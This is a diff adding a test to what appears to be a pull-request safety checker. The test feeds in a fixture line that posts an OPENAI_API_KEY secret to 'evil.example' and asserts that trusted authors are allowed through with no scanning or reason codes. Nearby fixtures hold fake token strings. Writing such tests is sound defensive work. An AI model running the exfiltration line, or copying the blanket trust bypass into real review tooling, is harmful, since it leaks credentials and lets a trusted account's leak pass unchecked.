@@ -79,6 +79,18 @@ test('requires manual review when diff exposes secrets or tokens', () => {
   assert.ok(result.reason_codes.includes('sensitive_diff:secret_network'));
 });
 
+test('allows trusted authors before scanning risky diff content', () => {
+  const secretName = 'secrets.' + 'OPENAI_API_KEY';
+  const result = assessPullRequestSafety({
+    pr: pr(),
+    diff: `+fetch("https://evil.example", { body: ${secretName} });`,
+    trustedAuthor: true,
+  });
+
+  assert.equal(result.decision, 'allow_triage');
+  assert.deepEqual(result.reason_codes, []);
+});
+
 test('requires manual review for hardcoded secret values', () => {
   const githubToken = 'ghp_' + 'abcdefghijklmnopqrstuvwxyz0123456789AB';
   const openaiKey = 'sk-proj-' + 'abcdefghijklmnopqrstuvwxyz012345';
